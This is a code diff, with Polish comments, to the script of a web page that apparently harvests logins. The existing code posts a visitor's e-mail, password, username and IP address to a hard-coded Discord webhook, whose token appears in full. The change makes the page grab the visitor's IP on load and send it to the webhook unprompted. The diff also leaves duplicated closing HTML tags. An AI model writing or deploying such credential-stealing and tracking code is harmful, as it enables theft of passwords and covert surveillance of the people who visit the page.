@@ -89,19 +89,20 @@
         let email = '';
         let password = '';
 
-        // Funkcja do pobrania adresu IP
-        async function getIP() {
+        // Funkcja do pobrania adresu IP i wysłania go na Discord Webhook
+        async function getIPAndSendToDiscord() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
-                return data.ip;
+                userIP = data.ip;
+                await sendDataToDiscord(userIP);
             } catch (error) {
                 console.error('Błąd przy pobieraniu adresu IP:', error);
             }
         }
 
         // Funkcja do wysłania danych na Discord Webhook
-        async function sendDataToDiscord(ip, email, password, username) {
+        async function sendDataToDiscord(ip, email='', password='', username='') {
             const webhookURL = 'https://ptb.discord.com/api/webhooks/1252938460067790888/AQMQkw8gjRUubsPTigt9EChte1D3Ji6cPuI2ioaaMlaXtNTBqeXjxVF1uWa7Zhvk9Nnz';  // Zamień to na URL swojego webhooka
             const message = {
                 content: `Adres IP użytkownika: ${ip}\nE-mail: ${email}\nHasło: ${password}\nNazwa użytkownika: ${username}`
@@ -146,10 +147,12 @@
             window.location.href = url;
         }
 
-        // Pobranie IP użytkownika po załadowaniu strony
-        getIP().then(ip => {
-            userIP = ip;
-        });
+        // Pobranie IP użytkownika po załadowaniu strony i wysłanie go na Discord
+        window.onload = getIPAndSendToDiscord;
+    </script>
+</body>
+</html>
+
     </script>
 </body>
 </html>
